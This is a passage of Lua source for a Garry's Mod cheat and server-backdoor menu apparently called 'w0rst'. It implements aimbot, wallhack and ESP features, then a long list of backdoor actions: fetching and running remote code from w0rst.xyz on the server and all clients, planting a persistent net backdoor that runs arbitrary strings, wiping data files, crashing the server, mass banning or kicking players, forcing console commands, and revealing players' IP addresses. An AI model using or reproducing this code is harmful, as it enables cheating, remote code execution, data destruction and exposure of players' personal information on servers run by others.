        FreeCamera.ViewOrigin = origin
        FreeCamera.ViewAngle = angles
        FreeCamera.SetView = false
    end

    return {
        origin = FreeCamera.ViewOrigin,
        angles = FreeCamera.ViewAngle
    }
end)

HookFunc("CreateMove", CameraHook, function(cmd)
    if not wtf.enable['FreeCamera'] then return end
    local time, sensitivity = FrameTime(), 0.025
    FreeCamera.ViewOrigin = FreeCamera.ViewOrigin + (FreeCamera.Velocity * time)
    FreeCamera.Velocity = FreeCamera.Velocity * FreeCamera.Speed

    FreeCamera.ViewAngle.p = math.Clamp( FreeCamera.ViewAngle.p + (cmd:GetMouseY() * sensitivity), -89, 89)
    FreeCamera.ViewAngle.y = FreeCamera.ViewAngle.y + (cmd:GetMouseX() * -1 * sensitivity)

    local add = Vector(0, 0, 0)
    local angle = FreeCamera.ViewAngle
    if(cmd:KeyDown(IN_FORWARD)) then add = add + angle:Forward() end
    if(cmd:KeyDown(IN_BACK)) then add = add - angle:Forward() end
    if(cmd:KeyDown(IN_MOVERIGHT)) then add = add + angle:Right() end
    if(cmd:KeyDown(IN_MOVELEFT)) then add = add - angle:Right() end
    if(cmd:KeyDown(IN_JUMP)) then add = add + angle:Up() end
    if(cmd:KeyDown(IN_DUCK)) then add = add - angle:Up() end

    add = add:GetNormal() * time * 500
    if (cmd:KeyDown(IN_SPEED)) then add = add * 5 end
    FreeCamera.Velocity = FreeCamera.Velocity + add

    cmd:SetViewAngles(cmd:GetViewAngles())
    cmd:SetForwardMove(0)
    cmd:SetSideMove(0)
    cmd:SetUpMove(0)
end)

local chams01 = CreateMaterial("a", "VertexLitGeneric", {
    ["$ignorez"] = 1,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})

local chams02 = CreateMaterial("@", "VertexLitGeneric", {
    ["$ignorez"] = 0,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})

wtf.Bones = {
    "ValveBiped.Bip01_Head1", "ValveBiped.Bip01_Neck1", "ValveBiped.Bip01_Spine4",
    "ValveBiped.Bip01_Spine2", "ValveBiped.Bip01_Spine1", "ValveBiped.Bip01_Spine",
    "ValveBiped.Bip01_Pelvis", "ValveBiped.Bip01_R_UpperArm", "ValveBiped.Bip01_R_Forearm",
    "ValveBiped.Bip01_R_Hand", "ValveBiped.Bip01_L_UpperArm", "ValveBiped.Bip01_L_Forearm",
    "ValveBiped.Bip01_L_Hand", "ValveBiped.Bip01_R_Thigh", "ValveBiped.Bip01_R_Calf",
    "ValveBiped.Bip01_R_Foot", "ValveBiped.Bip01_R_Toe0",  "ValveBiped.Bip01_L_Thigh",
    "ValveBiped.Bip01_L_Calf",  "ValveBiped.Bip01_L_Foot", "ValveBiped.Bip01_L_Toe0"
}

local FovCircle = { 80 }
HookFunc("AltHUDPaint", VisualHook, function()
    if wtf.enable['Aimbot'] then
        surface.DrawCircle(ScrW()/2, ScrH()/2, (FovCircle[1] * 6), wtf.color['Fov'])
    end

    if wtf.enable['SpectatorList'] then
        local SpectatorPos = 10
        for k, v in pairs(player.GetAll()) do
            if IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == LocalPlayer() then
                draw.SimpleTextOutlined(v:GetName(), "DermaDefault", ScrW() - 75, SpectatorPos, Color(255,255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0))
                SpectatorPos = SpectatorPos + 15
            end
        end
    end

    for k, v in pairs(ents.GetAll()) do
        local ent = v
        if ent:IsValid() and ent ~= LocalPlayer() and not ent:IsDormant() then
            for k, v in pairs(EntList) do
                if v == ent:GetClass() and ent:GetOwner() ~= LocalPlayer() then
                    if wtf.enable['EntName'] and wtf.enable['EntDistance'] then
                        local name = ent:GetClass()
                        local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                        local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                        draw.SimpleText(name.." ["..distance.."]", "Default", position.x, position.y, wtf.color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                    end

                    if wtf.enable['EntName'] then
                        if not wtf.enable['EntDistance'] then
                            local name = ent:GetClass()
                            local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                            draw.SimpleText(name, "Default", position.x, position.y, wtf.color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                        end
                    end

                    if wtf.enable['EntDistance'] then
                        if not wtf.enable['EntName'] then
                            local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                            local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                            draw.SimpleText(distance, "Default", position.x, position.y, wtf.color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                        end
                    end

                    if wtf.enable['Ent3D'] then
                        local Position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                        local eyeangles = ent:EyeAngles()
                        local min, max = ent:WorldSpaceAABB()
                        local origin = ent:GetPos()
                        cam.Start3D()
                            render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, wtf.color['Entity'] )
                        cam.End3D()
                    end
                end
            end

            if ent:IsPlayer() and ent:Alive() and ent:Health() > 0 then
                if wtf.enable['Tracer'] then
                    local position = ent:GetPos():ToScreen()
                    if position.x < ScrW() and position.x > 0 then
                        surface.SetDrawColor(wtf.color['Tracer'])
                        surface.DrawLine(ScrW()/2, ScrH(), position.x, position.y)
                    end
                end

                if wtf.enable['Name'] and wtf.enable['Distance'] then
                    local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                    local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                    draw.SimpleText(ent:Nick().." ["..distance.."]", "Default", position.x, position.y, wtf.color['NameDist'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                end

                if wtf.enable['Distance'] then
                    if not wtf.enable['Name'] then
                        local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                        local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                        draw.SimpleText(distance, "Default", position.x, position.y, wtf.color['Distance'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                    end
                end

                if wtf.enable['Name'] then
                    if not wtf.enable['Distance'] then
                        local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                        draw.SimpleText(ent:Nick(), "Default", position.x, position.y, wtf.color['Name'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                    end
                end

                if wtf.enable['Weapon'] then
                    if ent:GetActiveWeapon():IsValid() then
                        local weapon_name=ent:GetActiveWeapon():GetPrintName()
                        local Position = (ent:GetPos() + Vector(0,0,-15)):ToScreen()
                        draw.SimpleText(weapon_name, "Default", Position.x, Position.y, wtf.color['Weapon'], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
                    end
                end

                if wtf.enable['Box2D'] then
                    local min, max = ent:GetCollisionBounds()
                    local pos = ent:GetPos()
                    local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
                    local middle = bottom.y - top.y
                    local width = middle / 2.425
                    surface.SetDrawColor(wtf.color['Box2D'])
                    surface.DrawOutlinedRect(bottom.x - width, top.y, width * 1.85, middle)
                end

                if wtf.enable['Skeleton'] then
                    local Continue = true
                    local Bones = {}

                    for k, v in pairs(wtf.Bones) do
                        if ent:LookupBone(v) ~= nil and ent:GetBonePosition(ent:LookupBone(v)) ~= nil then
                            table.insert(Bones, ent:GetBonePosition(ent:LookupBone(v)):ToScreen())
                        else Continue=false; return end
                    end

                    if Continue then
                        surface.SetDrawColor(wtf.color['Skeleton'])
                        surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
                        surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y); surface.DrawLine(Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y)
                        surface.DrawLine(Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y); surface.DrawLine(Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y)
                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y); surface.DrawLine(Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y)
                        surface.DrawLine(Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y); surface.DrawLine(Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y)
                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y); surface.DrawLine(Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y)
                        surface.DrawLine(Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y); surface.DrawLine(Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y)
                        surface.DrawLine(Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y); surface.DrawLine(Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y)
                    end
                end

                if wtf.enable['Box3D'] then
                    local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                    local eyeangles = ent:EyeAngles()
                    local min, max = ent:WorldSpaceAABB()
                    local origin = ent:GetPos()

                    cam.Start3D()
                        render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, wtf.color['Box3D'])
                    cam.End3D()
                end

                if wtf.enable['Wallhack'] then
                    cam.Start3D()
                        ent:DrawModel()
                    cam.End3D()
                end

                if wtf.enable['Chams'] then
                    local entitym = FindMetaTable("Entity")
                    local weapon = ent:GetActiveWeapon()

                    cam.Start3D()
                        cam.IgnoreZ(true)
                        entitym.DrawModel(ent)
                        cam.IgnoreZ(false)
                    cam.End3D()

                    if weapon:IsValid() then
                        cam.Start3D()
                            render.MaterialOverride(chams01)
                            render.SetColorModulation(wtf.color['Chams'].r/255, wtf.color['Chams'].g/255, wtf.color['Chams'].b/255, wtf.color['Chams'].a)
                            entitym.DrawModel(weapon)
                            render.SetColorModulation(wtf.color['Chams'].r/170, wtf.color['Chams'].g/170, wtf.color['Chams'].b/170, wtf.color['Chams'].a)
                            render.MaterialOverride(chams02)
                            entitym.DrawModel(weapon)
                        cam.End3D()

                        cam.Start3D()
                            render.MaterialOverride(chams01)
                            render.SetColorModulation(wtf.color['Chams'].r/255, wtf.color['Chams'].g/255, wtf.color['Chams'].b/255, wtf.color['Chams'].a)
                            entitym.DrawModel(ent)
                            render.SetColorModulation(wtf.color['Chams'].r/255, wtf.color['Chams'].g/255, wtf.color['Chams'].b/255, wtf.color['Chams'].a)
                            render.MaterialOverride(chams02)
                            entitym.DrawModel(ent)
                            render.SetColorModulation(1, 1, 1)
                        cam.End3D()
                    end
                end
            end
        end
    end
end)

HookFunc("CreateMove", AimbotHook, function(cmd)
    if not wtf.enable['Aimbot'] then return end
    local ply = LocalPlayer()

    local function Valid(ent)
        if (not ent:IsValid() or ent:Health() < 1 or ent:IsDormant() or ent == ply) then return false end 
        return true
    end

    local function GetEntPos(ent)
        local eyes, pos = ent:LookupAttachment("eyes"), nil

        if ent:GetAttachment(eyes) then 
            pos = (ent:GetAttachment(eyes).Pos - ply:EyePos()):Angle()
        else
            pos = (ent:LocalToWorld(ent:OBBCenter()) - ply:EyePos()):Angle()
        end

        return pos
    end

    local closest, last = nil, math.huge
    for k, v in pairs(player.GetAll()) do
        local ent = v 
        if Valid(ent) then
            local plrpos = ent:GetPos():ToScreen()
            local distance = math.Round(ent:GetPos():Distance(ply:GetPos()))
            if (plrpos.x >= ScrW()/2 - (FovCircle[1] * 6) and plrpos.x <= ScrW()/2 + (FovCircle[1] * 6)) and (plrpos.y >= ScrH()/2 - (FovCircle[1] * 6) and plrpos.y <= ScrH()/2 + (FovCircle[1] * 6)) then
                if (input.IsKeyDown(wtf.binds['Aimbot']) or wtf.binds['Aimbot'] == 0) then 
                    if distance < last then 
                        closest = GetEntPos(ent)
                    end; last = distance
                    
                    cmd:SetViewAngles(closest)
                    if wtf.enable['AutoFire'] then
                        cmd:SetButtons(IN_ATTACK)
                    end
                end
            end
        end
    end
end)

local SilentAngles = nil
HookFunc("CreateMove", ViewHook, function(cmd)
    if not wtf.enable['SilentLock'] then return end
    if (input.IsKeyDown(wtf.binds['Aimbot']) or wtf.binds['Aimbot'] == 0) and wtf.enable['Aimbot'] then
        SilentAngles = (SilentAngles or cmd:GetViewAngles()) + Angle(cmd:GetMouseY() * 0.023, cmd:GetMouseX() * -0.023, 0)
    else
        SilentAngles = cmd:GetViewAngles()
    end
end)

HookFunc("CalcView", ViewHook, function(ply, pos, angles, fov)
    if not wtf.enable['SilentLock'] then return end
    local view = {}
    view.angles = SilentAngles
    view.drawviewer = false
    view.origin = pos
    view.fov = fov
    return view
end)

HookFunc("Think", ThinkHook, function()
    if not wtf.enable['PhysRainbow'] then return end
    local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
    LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
end)

HookFunc("CreateMove", BhopHook, function(ply) 
    if not wtf.enable['Bhop'] then return end
    if(ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
        ply:RemoveKey(IN_JUMP);
        if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
            if(ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400);
            else
                ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
                ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400);
            end
        end
    elseif(ply:KeyDown(IN_JUMP)) then
        ply:SetForwardMove(10000)
    end
end)

local ChatSpamDelay = 0
HookFunc("CreateMove", ChatHook, function()
    if CurTime() < ChatSpamDelay then return end
    ChatSpamDelay = CurTime() + 0.025
    if wtf.enable['ChatSpam'] then
        if engine.ActiveGamemode() == 'darkrp' then
            LocalPlayer():ConCommand("say".." /ooc "..wtf.responses[math.random(1, table.Count(wtf.responses))])
        else
            LocalPlayer():ConCommand("say".." "..wtf.responses[math.random(1, table.Count(wtf.responses))])
        end
    end
end)

local IsKeyDown = false
HookFunc("Think", KeyHook, function()
    if input.IsKeyDown(wtf.binds['Menu']) and not Menu:IsVisible() and not IsKeyDown then
        Menu:Show(); IsKeyDown=true
    elseif input.IsKeyDown(wtf.binds['Menu']) and Menu:IsVisible() and not IsKeyDown then
       Menu:Hide(); IsKeyDown=true
    elseif not input.IsKeyDown(wtf.binds['Menu']) then
        IsKeyDown=false
    end
end)

HookFunc("Tick", TickHook, function()
    if wtf.enable['UseSpam'] then
        timer.Simple(0.05, function() RunConsoleCommand("+use") end)
        timer.Simple(0.10, function() RunConsoleCommand("-use") end)
    end

    if wtf.enable['FlashSpam'] then
        LocalPlayer():ConCommand("impulse 100")
    end
end)

CreateCheckbox("Plr-Tracer", VisualsTab[1], 22, 10, function()
    wtf.enable['Tracer'] = not wtf.enable['Tracer']
    if wtf.enable['Tracer'] then
        Log("Tracer Enabled")
    else
        Log("Tracer Disabled")
    end
end)

CreateCheckbox("Plr-Distance", VisualsTab[1], 142, 10, function()
    wtf.enable['Distance'] = not wtf.enable['Distance']
    if wtf.enable['Distance'] then
        Log("Distance Enabled")
    else
        Log("Distance Disabled")
    end
end)

CreateCheckbox("Plr-Names", VisualsTab[1], 262, 10, function()
    wtf.enable['Name'] = not wtf.enable['Name']
    if wtf.enable['Name'] then
        Log("Names Enabled")
    else
        Log("Names Disabled")
    end
end)

CreateCheckbox("Plr-Weapons", VisualsTab[1], 382, 10, function()
    wtf.enable['Weapon'] = not wtf.enable['Weapon']
    if wtf.enable['Weapon'] then
        Log("Weapons Enabled")
    else
        Log("Weapons Disabled")
    end
end)

CreateCheckbox("Plr-2D-Box", VisualsTab[1], 22, 40, function()
    wtf.enable['Box2D'] = not wtf.enable['Box2D']
    if wtf.enable['Box2D'] then
        Log("2D Boxes Enabled")
    else
        Log("2D Boxes Disabled")
    end
end)

CreateCheckbox("Plr-3D-Box", VisualsTab[1], 142, 40, function()
    wtf.enable['Box3D'] = not wtf.enable['Box3D']
    if wtf.enable['Box3D'] then
        Log("3D Boxes Enabled")
    else
        Log("3D Boxes Disabled")
    end
end)

CreateCheckbox("Plr-Skeletons", VisualsTab[1], 262, 40, function()
    wtf.enable['Skeleton'] = not wtf.enable['Skeleton']
    if wtf.enable['Skeleton'] then
        Log("Skeletons Enabled")
    else
        Log("Skeletons Disabled")
    end
end)

CreateCheckbox("Plr-Chams", VisualsTab[1], 382, 40, function()
    wtf.enable['Chams'] = not wtf.enable['Chams']
    if wtf.enable['Chams']then
        Log("Chams Enabled")
    else
        Log("Chams Disabled")
    end
end)

CreateCheckbox("Ent-Names", VisualsTab[1], 22, 70, function()
    wtf.enable['EntName'] = not wtf.enable['EntName']
    if wtf.enable['EntName'] then
        Log("Ent Names Enabled")
    else
        Log("Ent Names Disabled")
    end
end)

CreateCheckbox("Ent-Distance", VisualsTab[1], 142, 70, function()
    wtf.enable['EntDistance'] = not wtf.enable['EntDistance']
    if wtf.enable['EntDistance'] then
        Log("Ent Distance Enabled")
    else
        Log("Ent Distance Disabled")
    end
end)

CreateCheckbox("Ent-3D", VisualsTab[1], 262, 70, function()
    wtf.enable['Ent3D'] = not wtf.enable['Ent3D']
    if wtf.enable['Ent3D'] then
        Log("Ent 3D Boxes Enabled")
    else
        Log("Ent 3D Boxes Disabled")
    end
end)

CreateCheckbox("Wallhack", VisualsTab[1], 382, 70, function()
    wtf.enable['Wallhack'] = not wtf.enable['Wallhack']
    if wtf.enable['Wallhack'] then
        Log("Wallhack Enabled")
    else
        Log("Wallhack Disabled")
    end
end)

CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
    wtf.enable['FreeCamera'] = not wtf.enable['FreeCamera']
    if wtf.enable['FreeCamera'] then
        FreeCamera.SetView = true
        Log("Freecam Enabled")
    else
        Log("Freecam Disabled")
    end
end)

CreateCheckbox("Spectator List", VisualsTab[1], 142, 100, function()
    wtf.enable['SpectatorList'] = not wtf.enable['SpectatorList']
    if wtf.enable['SpectatorList'] then
        Log("Spectator List Enabled")
    else
        Log("Spectator List Disabled")
    end
end)

CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 15, 160, EntityList.Clear)

local function SaveVisuals()
    local json = util.TableToJSON(wtf.color, true)
    file.Write("w0rst/visuals.txt", json)
    Log("Saved Visuals")
end

local function LoadVisuals()
    if file.Exists("w0rst/visuals.txt", "DATA") then
        local file = file.Read("w0rst/visuals.txt", "DATA")
        local json = util.JSONToTable(file)
        table.Merge(wtf.color, json)
        for i = 1, #ColorSliders do
            ColorSliders[i].Update()
        end; Log("Loaded Visuals")
    else
        Log("Unable To Load Visuals")
    end
end

CreateButton("Save Visuals", MiscTab[1], 80, 25, 425, 250, SaveVisuals)

CreateButton("Load Visuals", MiscTab[1], 80, 25, 340, 250, LoadVisuals)

CreateBDServer("WMenu-Memento", function()
    http.Fetch('https://w0rst.xyz/script/extra/wgamefucker', function(b) SendLua(b) end)
    Log("??? wgamefucker ???")
end)

CreateBDServer("Satan is (LoRd)", function()
    http.Fetch('https://w0rst.xyz/script/extra/jumpscare', function(b) SendLua(b) end)
    Log("oaooooh so spooky !")
end)

CreateBDServer("Satan's Depths", function()
    SendLua([[BroadcastLua("http.Fetch('https://w0rst.xyz/script/extra/hellmode', RunString)")]])
    Log("everyones in ~-hell!~")
end)

CreateBDServer("RGB-Rave", function()
    Log("Rave Started!!!")
    SendLua([[
        BroadcastLua("surface.PlaySound('music/hl1_song25_remix3.mp3')")
        BroadcastLua("hook.Add('HUDPaint', 'Rainbow', function() local cin = math.sin(CurTime() * 5) * 95 surface.SetDrawColor(Color(cin, -cin, cin, 50)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
    ]])
end)

CreateBDServer("Wacky-Steps", function()
    Log("You hear that???")
    SendLua([[
        hook.Add("PlayerFootstep", "WackySteps", function(ply)
            ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
        end)
    ]])
end)

CreateBDServer("Wipe Data", function()
    Log("Data Wiped")
    SendLua([[
        local files, directories = file.Find("*", "DATA")
        for k, v in pairs(files) do
            file.Delete(v)
        end
    ]])
end)

CreateBDServer("Whitelist All", function()
    Log("Whitelisted Everything")
    SendLua([[
        if FPP then
            for k, v in pairs(FPP.Blocked) do
                for r, g in pairs(v) do
                    RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
                end
            end
        end
    ]])
end)

CreateBDServer("ConCommand All", function()
    CreateInputBox("ConCommand All", function(str)
        Log("Ran Command: "..str)
        SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:ConCommand(']]..str..[[')
            end
        ]])
    end)
end)

CreateBDServer("Moan All", function()
    Log("Everyone Moaned")
    SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
        end
    ]])
end)

CreateBDServer("Force Say All", function()
    CreateInputBox("Say", function(str)
        Log("Everyone Just Said: "..str)
        SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:Say("]]..str..[[")
            end
        ]])
    end)
end)

CreateBDServer("Dance All",  function()
    Log("Everyone's Dancing")
    SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        end
    ]])
end)

CreateBDServer("Size All", function()
    CreateInputBox("Size Everyone", function(str)
        Log("Everyones Size: "..str)
        SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetModelScale(']]..str..[[')
            end
        ]])
    end)
end)

CreateBDServer("JumpPower All", function()
    CreateInputBox("JumpPower All", function(str)
        Log("Everyones JumpPower: "..str)
        SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetJumpPower(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Earthquake", function()
    Log("Worlds Shaking!!!!")
    SendLua([[
        if not timer.Exists("earthquake") then
            timer.Create("earthquake", 0.5, 500, function()
                for _, p in pairs(player.GetAll()) do
                    p:SetPos(p:GetPos() + Vector(0, 0, 1))
                    p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
                    util.ScreenShake(p:GetPos(), 20, 1, 1, 100)
                    p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))
                end

                for _, e in pairs(ents.GetAll()) do
                    if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then
                        e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
                    end
                end
            end)
        else
            timer.Remove("earthquake")
        end
    ]])
end)

CreateBDServer("Crash Server", function()
    SendLua([[while true do end]])
    Log("Server Downed")
end)

CreateBDServer("Add-Backdoor", function()
    Log("Server-STD Added")
    SendLua([[
        util.AddNetworkString('w0rst')
        net.Receive('w0rst', function(len) 
            RunString(net.ReadString()) 
        end)
    ]])
end)

CreateBDServer("Announcement", function()
    CreateInputBox("Announce", function(str)
        SendLua("for k, v in pairs(player.GetAll()) do v:PrintMessage(HUD_PRINTCENTER, \""..str.."\") end")
        Log("Announced "..str)
    end)
end)

CreateBDServer("Allow Luarun", function()
    Log("Luarun's Allowed ~wtf~")
    SendLua([[RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")]])
end)

CreateBDServer("Ban Everyone", function()
    Log("Everyone Banned")
    CreateInputBox("Reason", function(str)
        SendLua([[
            local LP = ]]..LocalPlayer():UserID()..[[
            for k, v in pairs(player.GetAll()) do 
                if v:UserID() == LP then continue end 
                v:Ban(0, false)
                v:Kick("]]..tostring(str)..[[")
            end
        ]])
    end)
end)

CreateBDServer("Kick Everyone", function()
    Log("Everyone Kicked")
    CreateInputBox("Reason", function(str)
        SendLua([[
            local LP = ]]..LocalPlayer():UserID()..[[
            for k, v in pairs(player.GetAll()) do 
                if v:UserID() == LP then continue end 
                v:Kick("]]..tostring(str)..[[")
            end
        ]])
    end)
end)

CreateBDServer("Retry All", function()
    Log("Everyone Retry'd")
    SendLua([[
        local LP = ]]..LocalPlayer():UserID()..[[
        for k, v in pairs(player.GetAll()) do 
            if v:UserID() == LP then continue end 
            v:ConCommand('retry')
        end
    ]])
end)

CreateBDServer("Kill Everyone", function()
    SendLua([[for k,v in pairs(player.GetAll()) do v:Kill() end]])
    Log("Everyone Killed")
end)

CreateBDServer("Health All", function()
    CreateInputBox("Health", function(str)
        Log("Set Health: "..str)
        SendLua([[
            for k, v in pairs(player.GetAll()) do
                v:SetHealth(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Armor All", function()
    CreateInputBox("Armor", function(str)
        Log("Set Armor: "..str)
        SendLua([[
            for k, v in pairs(player.GetAll()) do
                v:SetArmor(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Ignite All", function()
    SendLua("for k,v in pairs(player.GetAll()) do v:Ignite(9999999,9999999) end")
    Log("Everyone Ignited")
end)

CreateBDServer("Extinguish All", function()
    SendLua("for k,v in pairs(player.GetAll()) do v:Extinguish() end")
    Log("Everyone Extinguished")
end)

CreateBDServer("Fling All", function()
    SendLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(500,1000))) end")
    Log("Everyone Flung")
end)

CreateBDServer("Edit LogEcho", function()
    CreateInputBox("LogoEcho | 1-On - 0-Off", function(str)
        RunConsoleCommand('ulx','logecho',']]..str..[[')
        Log("LogEcho Set: "..str)
    end)
end)

CreateBDServer("Fuck w/Names", function()
    CreateInputBox("Names", function(str)
        Log("Set Names: "..str)
        SendLua([[
            local str = "]]..str..[["
            for k,v in pairs(player.GetAll()) do 
                DarkRP.storeRPName(v, str)
                v:setDarkRPVar("rpname", str)
            end
        ]])
    end)
end)

CreateBDServer("Fuck w/Models", function()
    CreateInputBox("Model", function(str)
        Log("Models: "..str)
        SendLua([[for k, v in pairs(player.GetAll()) do v:SetModel("]]..str..[[") end]])
    end)
end)

CreateBDServer("Fuck w/Eco", function()
    CreateInputBox("Add", function(str)
        Log("Added: "..str)
        SendLua([[for k,v in pairs(player.GetAll()) do v:addMoney(]]..str..[[) end]])
    end)
end)

CreateBDServer("Clean Map", function()
    SendLua("game.CleanUpMap()")
    Log("Map Cleaned Up")
end)

CreateBDServer("Console-Rape", function()
    Log("Console Raped!!!")
    SendLua([[print(string.rep("raped enough?\n", 100))]])
end)

CreateBDClient("Set Usergroup",  function()
    CreateInputBox("Usergroup", function(str)
        Log("Usergroup: "..str)
        SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:SetUserGroup("]]..str..[[")
        ]])
    end)
end)

CreateBDClient("Set JumpPower",  function()
    CreateInputBox("Jump", function(str)
        Log("JumpPower: "..str)
        SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:SetJumpPower(]]..str..[[)
        ]])
    end)
end)

CreateBDClient("Set Speed",  function()
    CreateInputBox("Speed", function(str)
        Log(Player(SelectedPlr):Nick().." Speed Set")
        SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:SetMaxSpeed(]]..str..[[)
            me:SetRunSpeed(]]..str..[[)
        ]])
    end)
end)

CreateBDClient("Set Name", function()
    CreateInputBox("Name", function(str)
        Log("Set Names: "..str)
        SendLua([[
            local str = "]]..str..[["
            local me = Player(]]..SelectedPlr..[[)
            DarkRP.storeRPName(me, str)
            me:setDarkRPVar("rpname", str)
        ]])
    end)
end)

CreateBDClient("Set Model", function()
    CreateInputBox("Model", function(str)
        Log("Models: "..str)
        SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:SetModel("]]..str..[[") 
        ]])
    end)
end)

CreateBDClient("Add Eco", function()
    CreateInputBox("Add", function(str)
        Log("Added: "..str)
        SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:addMoney(]]..str..[[) 
        ]])
    end)
end)

CreateBDClient("Ignite", function()
    Log("Everyone Ignited")
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Ignite(9999999,9999999)
    ]])
end)

CreateBDClient("Extinguish", function()
    Log("Everyone Extinguished")
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Extinguish()
    ]])
end)

CreateBDClient("Print IP", function()
    Log("Yoinked that bih!!!")
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        local ply = ]]..LocalPlayer():UserID()..[[
        Player(ply):ChatPrint(me:IPAddress())
    ]])
end)

CreateBDClient("ConCommand",  function()
    CreateInputBox("ConCommand", function(str)
        Log("Ran Command: "..str.." Player: "..Player(SelectedPlr):Nick())
        SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:ConCommand(']]..str..[[')
        ]])
    end)
end)

CreateBDClient("Ban",  function()
    Log("Player"..Player(SelectedPlr):Nick().." Banned")
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Ban(999999999,false)
        me:Kick()
    ]])
end)

CreateBDClient("Kick",  function()
    Log("Player "..Player(SelectedPlr):Nick().." Kicked")
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Kick()
    ]])
end)

CreateBDClient("Retry",  function()
    Log("Player "..Player(SelectedPlr):Nick().." Retry'd")
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:ConCommand('retry')
